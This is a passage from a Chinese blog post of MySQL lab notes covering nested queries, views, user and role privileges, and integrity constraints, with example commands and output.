student.Sno,student.Sname,course.Cname,sc.Grade from student,course,sc where student.Sno=sc.Sno and sc.Cno=course.Cno and sc.Grade&gt;=90;//查询考试成绩在90分以上的学生学号(Sno)、姓名(Sname)、选修的课程名(Cname)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"带谓词-IN-的嵌套查询\"><a href=\"#带谓词-IN-的嵌套查询\" class=\"headerlink\" title=\"带谓词 IN 的嵌套查询\"></a>带谓词 IN 的嵌套查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Sname,Sdept from student where Sno in (select Sno from sc where Cno=&apos;2&apos;); //查询选修了编号为“C02”的课程的学生姓名(Sname)和所在系(Sdept)。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno,Sname,Sdept from student where Sdept in (select sdept from student where Sname=&apos;WangMin&apos;);</span><br><span class=\"line\">//查询与“李伟”在同一个系学习的学生学号(Sno)、姓名(Sname)和系名(Sdept)。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"视图\"><a href=\"#视图\" class=\"headerlink\" title=\"视图\"></a>视图</h2><h3 id=\"建立视图\"><a href=\"#建立视图\" class=\"headerlink\" title=\"建立视图\"></a>建立视图</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.1\t建立数学系学生的视图math_stu，并要求进行修改和插入操作时仍需保证该视图只有数学系的学生，视图的属性名为Sno，Sname，Sage，Sdept。</span><br><span class=\"line\">mysql&gt; create view math_stu</span><br><span class=\"line\">    -&gt; as select</span><br><span class=\"line\">    -&gt; Sno,Sname,Sage,Sdept</span><br><span class=\"line\">    -&gt; from student where Sdept=&apos;MATH&apos;;</span><br><span class=\"line\">Query OK, 0 rows affected (0.16 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from math_stu;</span><br><span class=\"line\">+-----------+--------+------+-------+</span><br><span class=\"line\">| Sno       | Sname  | Sage | Sdept |</span><br><span class=\"line\">+-----------+--------+------+-------+</span><br><span class=\"line\">| 201215124 | JingYu |   27 | MATH  |</span><br><span class=\"line\">+-----------+--------+------+-------+</span><br><span class=\"line\">1 row in set (0.10 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1.2  建立学生的学号(Sno)、姓名(Sname)、选修课程名(Cname)及成绩(Grade)的视图grade_stu。</span><br><span class=\"line\">mysql&gt; create view grade_stu</span><br><span class=\"line\">    -&gt; as select</span><br><span class=\"line\">    -&gt; s.Sno,s.Sname,c.Cname,sc.Grade</span><br><span class=\"line\">    -&gt; from student s,course c,sc;</span><br><span class=\"line\">Query OK, 0 rows affected (0.12 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">这种方法创建完之后我们发现存在大量重复且错误的数据,猜想是因为没有指定表之间的关系导致的。下面这个是正确的查询方式。</span><br><span class=\"line\">mysql&gt; create view grade_stu</span><br><span class=\"line\">    -&gt; as select</span><br><span class=\"line\">    -&gt; s.Sno,s.Sname,c.Cname,sc.Grade</span><br><span class=\"line\">    -&gt; from student s,course c,sc</span><br><span class=\"line\">    -&gt; where s.Sno=sc.Sno and c.Cno=sc.Cno;</span><br><span class=\"line\">Query OK, 0 rows affected (0.12 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from grade_stu;</span><br><span class=\"line\">+-----------+---------+------------+-------+</span><br><span class=\"line\">| Sno       | Sname   | Cname      | Grade |</span><br><span class=\"line\">+-----------+---------+------------+-------+</span><br><span class=\"line\">| 201215121 | LiYong  | database   |    92 |</span><br><span class=\"line\">| 201215121 | LiYong  | infosystem |    85 |</span><br><span class=\"line\">| 201215121 | LiYong  | math       |    88 |</span><br><span class=\"line\">| 201215122 | LiuChen | math       |    90 |</span><br><span class=\"line\">| 201215122 | LiuChen | infosystem |    80 |</span><br><span class=\"line\">+-----------+---------+------------+-------+</span><br><span class=\"line\">5 rows in set (0.33 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">我们还可以尝试 left join &amp; right join 的方式，本质上完全一样：</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; create view grade_stu</span><br><span class=\"line\">    -&gt; as select</span><br><span class=\"line\">    -&gt; s.Sno,s.Sname,c.Cname,sc.Grade</span><br><span class=\"line\">    -&gt; from sc</span><br><span class=\"line\">    -&gt; left join student s on s.Sno=sc.Sno</span><br><span class=\"line\">    -&gt; left join course c on c.Cno=sc.Cno;</span><br><span class=\"line\">Query OK, 0 rows affected (0.11 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">1.3  定义一个反映学生出生年份的视图Student_birth。</span><br><span class=\"line\">mysql&gt; create view Student_brith (s_name,s_brith) as select Sname,2020-student.Sage from student;</span><br><span class=\"line\"></span><br><span class=\"line\">1.4 定义一个视图AVGG，视图列中有课程号、这门课程的平均成绩，且平均成绩大于80分。</span><br><span class=\"line\">mysql&gt; create view AVGG (cno,avg_grade) as select Cno,AVG(Grade) from sc group by Cno HAVING AVG(Grade)&gt;80;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"删除视图\"><a href=\"#删除视图\" class=\"headerlink\" title=\"删除视图\"></a>删除视图</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; drop view if exists grade_stu;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"查询视图\"><a href=\"#查询视图\" class=\"headerlink\" title=\"查询视图\"></a>查询视图</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3.1 在数学系的学生视图math_stu中找出年龄(Sage)小于20岁的学生姓名(Sname)和年龄(Sage)。</span><br><span class=\"line\">mysql&gt; select Sname,Sage from math_stu where Sage&lt;20;</span><br><span class=\"line\"></span><br><span class=\"line\">3.2  在grade_stu视图中查询成绩在85分以上的学生学号(Sno)、姓名(Sname)和课程名称(Cname)。</span><br><span class=\"line\">mysql&gt; select Sno,Sname,Cname from grade_stu where Grade&gt;85;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"更新视图\"><a href=\"#更新视图\" class=\"headerlink\" title=\"更新视图\"></a>更新视图</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：ALTER VIEW &lt;视图名&gt; AS &lt;SELECT语句&gt;</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，对于 ALTER VIEW 语句的使用，需要用户具有针对视图的 CREATE VIEW 和 DROP 权限，以及由 SELECT 语句选择的每一列上的某些权限。</p>\n<p> 修改视图的定义，除了可以通过 ALTER VIEW 外，也可以使用 DROP VIEW 语句先删除视图，再使用 CREATE VIEW 语句来实现。</p>\n<p>视图是一个虚拟表，实际的数据来自于基本表，所以通过插入、修改和删除操作更新视图中的数据，实质上是在更新视图所引用的基本表的数据。</p>\n<p>注意：对视图的修改就是对基本表的修改，因此在修改时，要满足基本表的数据定义。</p>\n<p>某些视图是可更新的。也就是说，可以使用 UPDATE、DELETE 或 INSERT 等语句更新基本表的内容。对于可更新的视图，视图中的行和基本表的行之间必须具有一对一的关系。</p>\n<p>还有一些特定的其他结构，这些结构会使得视图不可更新。更具体地讲，如果视图包含以下结构中的任何一种，它就是不可更新的：</p>\n<ul>\n<li>聚合函数 SUM()、MIN()、MAX()、COUNT() 等。</li>\n<li>DISTINCT 关键字。</li>\n<li>GROUP BY 子句。</li>\n<li>HAVING 子句。</li>\n<li>UNION 或 UNION ALL 运算符。</li>\n<li>位于选择列表中的子查询。</li>\n<li>FROM 子句中的不可更新视图或包含多个表。</li>\n<li>WHERE 子句中的子查询，引用 FROM 子句中的表。</li>\n<li>ALGORITHM 选项为 TEMPTABLE（使用临时表总会使视图成为不可更新的）的时候。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4.1 将数学系学生视图math_stu中学号为200215123的学生姓名改为“黄海”。</span><br><span class=\"line\">mysql&gt; update math_stu set Sname=&apos;huanghai&apos; where Sno=&apos;201215124&apos;;</span><br><span class=\"line\">我们再去查询基本表发现 studnet 表中的数据已经被修改。</span><br><span class=\"line\"></span><br><span class=\"line\">4.2  向数学系学生视图math_stu中插入一个新的学生记录，其中学号为“S09”，姓名为“王海”，年龄为20岁。</span><br><span class=\"line\">mysql&gt; INSERT INTO math_stu (Sno,Sname,Sage,Sdept) values (&apos;s09&apos;,&apos;wanghai&apos;,20,&apos;MATH&apos;);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"用户\"><a href=\"#用户\" class=\"headerlink\" title=\"用户\"></a>用户</h2><h3 id=\"创建用户\"><a href=\"#创建用户\" class=\"headerlink\" title=\"创建用户\"></a>创建用户</h3><p>可以使用 CREATE USER 语句来创建一个或多个 MySQL 账户，并设置相应的口令。</p>\n<p> 语法格式：</p>\n<p><code>CREATE USER &lt;用户名&gt; [ IDENTIFIED ] BY [ PASSWORD ] &lt;口令&gt;</code></p>\n<p>语法说明如下：</p>\n<p> 1) &lt;用户名&gt;</p>\n<p>指定创建用户账号，格式为 ‘user_name’@’host_name’。这里<code>user_name</code>是用户名，<code>host_name</code>为主机名，即用户连接 MySQL 时所在主机的名字。若在创建的过程中，只给出了账户的用户名，而没指定主机名，则主机名默认为“%”，表示一组主机。</p>\n<p> 2) PASSWORD</p>\n<p>可选项，用于指定散列口令，即若使用明文设置口令，则需忽略<code>PASSWORD</code>关键字；若不想以明文设置口令，且知道 PASSWORD() 函数返回给密码的散列值，则可以在口令设置语句中指定此散列值，但需要加上关键字<code>PASSWORD</code>。</p>\n<p> 3) IDENTIFIED BY子句</p>\n<p>用于指定用户账号对应的口令，若该用户账号无口令，则可省略此子句。</p>\n<p> 4) &lt;口令&gt;</p>\n<p>指定用户账号的口令，在<code>IDENTIFIED BY</code>关键字或<code>PASSWOED</code>关键字之后。给定的口令值可以是只由字母和数字组成的明文，也可以是通过 PASSWORD() 函数得到的散列值。</p>\n<p> 使用 CREATE USER 语句应该注意以下几点：</p>\n<ul>\n<li>如果使用 CREATE USER 语句时没有为用户指定口令，那么 MySQL 允许该用户可以不使用口令登录系统，然而从安全的角度而言，不推荐这种做法。</li>\n<li>使用 CREATE USER 语句必须拥有 MySQL 中 MySQL 数据库的 INSERT 权限或全局 CREATE USER 权限。</li>\n<li>使用 CREATE USER 语句创建一个用户账号后，会在系统自身的 MySQL 数据库的 user 表中添加一条新记录。若创建的账户已经存在，则语句执行时会出现错误。</li>\n<li>新创建的用户拥有的权限很少。他们可以登录 MySQL，只允许进行不需要权限的操作，如使用 SHOW 语句查询所有存储引擎和字符集的列表等。</li>\n</ul>\n<p> 如果两个用户具有相同的用户名和不同的主机名，MySQL 会将他们视为不同的用户，并允许为这两个用户分配不同的权限集合。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5.1创建两个用户，一个以你的名字（汉语拼音）命名的用户，登陆名也为你的名字（汉语拼音），另一个为你同学（汉语拼音）的名字命名的一个用户，登录名为你同学的名字（汉语拼音）。</span><br><span class=\"line\">mysql&gt; create user &apos;brain&apos;@&apos;localhost&apos; identified by &apos;123456&apos;;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; create user &apos;fuck&apos;@&apos;localhost&apos; identified by &apos;321654&apos;;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"用户权限\"><a href=\"#用户权限\" class=\"headerlink\" title=\"用户权限\"></a>用户权限</h3><h3 id=\"角色\"><a href=\"#角色\" class=\"headerlink\" title=\"角色\"></a>角色</h3><p>通常，MySQL 数据库拥有多个相同权限集合的用户。以前，向多个用户授予和撤销权限的唯一方法是单独更改每个用户的权限，假如用户数量比较多的时候，这是非常耗时的。<a href=\"https://www.yiibai.com/mysql/roles.html\" target=\"_blank\" rel=\"noopener\">MySql 角色</a></p>\n<p>为了用户权限管理更容易，MySQL提供了一个名为<code>role</code>的新对象，它是一个命名的特权集合。</p>\n<p>如果要向多个用户授予相同的权限集，则应如下所示：</p>\n<ul>\n<li><em>首先</em>，创建新的角色。</li>\n<li><em>第二</em>，授予角色权限。</li>\n<li><em>第三</em>，授予用户角色。</li>\n</ul>\n<p>如果要更改用户的权限，则需要仅更改授权角色的权限。这些更改角色的权限将对授予角色的所有用户生效。</p>\n<p>假设您开发了一个使用<code>crmdb</code>数据库的应用程序。要与<code>crmdb</code>数据库进行交互，您需要为需要完全访问数据库的开发人员创建帐户。此外，需要为仅需读取访问权限的用户创建帐户，以及为读取/写入访问权限的用户创建帐户。</p>\n<p>要避免单独为每个用户帐户授予权限，您可以创建一组角色，并为每个用户帐户授予相应的角色。</p>\n<p>要创建新角色，请使用<code>CREATE ROLE</code>语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5.2在学生管理数据库上创建两个角色R1和R2，把你这个用户放入R1和把你同学的用户放入角色R2中。</span><br><span class=\"line\">create role if not exists &apos;R1&apos;,&apos;R2&apos;；</span><br><span class=\"line\">GRANT R1 TO brain@localhost;</span><br><span class=\"line\">GRANT R2 TO fuck@localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">5.3给角色R1授权，使其可以查询学生管理数据库中的student表以及查询视图math_stu。</span><br><span class=\"line\">grant select on studentinfo.student to R1;</span><br><span class=\"line\">set default role R1 to brain@localhost;</span><br><span class=\"line\">要在每次用户帐户连接到数据库服务器时指定哪些角色应该处于活动状态，请使用SET DEFAULT ROLE语句。</span><br><span class=\"line\"></span><br><span class=\"line\">5.4给角色R2授权，使其可以插入和更新学生管理数据库中的student表</span><br><span class=\"line\">grant insert,update on studentinfo.student to R2;</span><br><span class=\"line\">set default role R2 to fuck@localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">5.5请分别以你自己名字命名的用户和你同学（汉语拼音）的名字命名的用户分别登录学生管理数据库对student表查询，再对student表进行插入和更新，看看分别是什么结果。</span><br><span class=\"line\"> mysql -h localhost -u brain -p 123456</span><br><span class=\"line\"> select * from student; //此时用户是R1，查询成功，但是无法使用 insert 或者 update 因为我们只赋予了他一个权限。</span><br><span class=\"line\"> </span><br><span class=\"line\">5.6 把角色R1的中对student表查询的权限收回。</span><br><span class=\"line\">REVOKE SELECT ON studentinfo.student from R1;</span><br><span class=\"line\"></span><br><span class=\"line\">5.7再次以你自己名字命名的用户登录学生管理数据库对student表查询看是什么结果。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"数据库完整性\"><a href=\"#数据库完整性\" class=\"headerlink\" title=\"数据库完整性\"></a>数据库完整性</h2><p>数据库的完整性 ( integrity ) 是指数据的正确性 ( correctness) 和相容性 (compat-ability) .</p>\n<p>为了维护数据库的完整性，需要实现：</p>\n<ul>\n<li>提供定义完整性约束条件的机制</li>\n<li>提供完整性检查方法：一般在 <code>INSERT,UPDATE,DELETE</code> 语句执行后开始检查，也可以在事务提交时检查。</li>\n<li>进行违约处理</li>\n</ul>\n<p>关系数据库管理系统使得完整性控制成为其核心支持的功能，从而能够为所有用户和应用提供一致的数据库完整性。</p>\n<h3 id=\"实体完整性\"><a href=\"#实体完整性\" class=\"headerlink\" title=\"实体完整性\"></a>实体完整性</h3><p>关系模型的实体完整性在 <code>CREATE TABLE</code> 中用 <code>PRIMARY KEY</code> 定义。单属性码有两种说明方法：列级约束条件和表级约束条件；多属性码只有表级约束条件。</p>\n<h4 id=\"实体完整性检查和违约处理\"><a href=\"#实体完整性检查和违约处理\" class=\"headerlink\" title=\"实体完整性检查和违约处理\"></a>实体完整性检查和违约处理</h4><p>定义完关系的主码之后，每当用户程序对基本表插入一条记录或者对主码列进行更新操作时，会进行实体完整性检查：</p>\n<ul>\n<li>检查主码是否唯一，不唯一则拒绝插入或修改</li>\n<li>检查主码的各个属性是否为空，有一个为空就拒绝插入或修改</li>\n</ul>\n<p>使用<code>B+</code> 索引树来查找基本表是否已经存在新的主码值。</p>\n<h3 id=\"参照完整性\"><a href=\"#参照完整性\" class=\"headerlink\" title=\"参照完整性\"></a>参照完整性</h3><p>关系模型的参照完整性在 <code>CREATE TABLE</code> 中用 <code>FOREIGN KEY</code> 短语定义哪些列为外码，用 <code>PERFERENCES</code> 短语指明这些外码参照哪些表的主码。</p>\n<h4 id=\"参照完整性检查和违约处理\"><a href=\"#参照完整性检查和违约处理\" class=\"headerlink\" title=\"参照完整性检查和违约处理\"></a>参照完整性检查和违约处理</h4><p>参照完整性将两个表中的相应元组联系起来了。因此，对被参照表和参照表进行增删改操作可能破坏参照完整性，必须检查两个表的相容性。</p>\n<p>当相容性发生不一致时，系统可以采用一下策略加以处理：</p>\n<ul>\n<li>拒绝执行- <code>NO ACTION</code> ：默认操作</li>\n<li>级联操作- <code>CASCADE</code> : 当删除或修改被参照表的一个元组导致与参照表的不一致时，删除或修改参照表中的所有导致不一致的元组。</li>\n<li>设置为空值 ：当删除或修改被参照表的一个元组时造成了不一致，则将参照表中的所有造成不一致的元组的对应属性设置为空值。</li>\n</ul>\n<p>对于参照完整性，除了应该定义外码，还应定义外码是否允许空值。</p>\n<h3 id=\"用户定义的完整性\"><a href=\"#用户定义的完整性\" class=\"headerlink\" title=\"用户定义的完整性\"></a>用户定义的完整性</h3><p>针对某一具体应用的数据必须满足的语义条件。</p>\n<h4 id=\"属性上的约束条件\"><a href=\"#属性上的约束条件\" class=\"headerlink\" title=\"属性上的约束条件\"></a>属性上的约束条件</h4><ul>\n<li><code>NOT NULL</code> 列值非空</li>\n<li><code>UNIQUE</code> 列值唯一</li>\n<li><code>CHECK</code> 检查列值是否满足一个条件表达式</li>\n</ul>\n<p>插入元组或修改属性的值时，关系数据库管理系统将检查属性上的约束条件是否被满足，不满足则操作被拒绝执行。</p>\n<h4 id=\"元组上的约束条件\"><a href=\"#元组上的约束条件\" class=\"headerlink\" title=\"元组上的约束条件\"></a>元组上的约束条件</h4><p>在 <code>CREATE TABLE</code> 中可以用<code>CHECK</code> 短句定义元组上的约束条件，即元组级的限制。元组级的限制可以设置不同属性之间的取值的相互约束条件。</p>\n<p>插入元组或修改属性的值时，关系数据库管理系统将检查元组上的约束条件是否被满足，不满足则操作被拒绝执行。</p>\n","text":"数据库概论E-R图增删改查创建新表并插入数据1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>mysql&gt; show tables;<br>+-----------------------+<br>| Tables_in_studentinfo","link":"","raw":null,"photos":[],"categories":[{"name":"SQL","slug":"SQL","count":1,"path":"api/categories/SQL.json"}],"tags":[{"name":"MySql","slug":"MySql","count":2,"path":"api/tags/MySql.json"}]}]}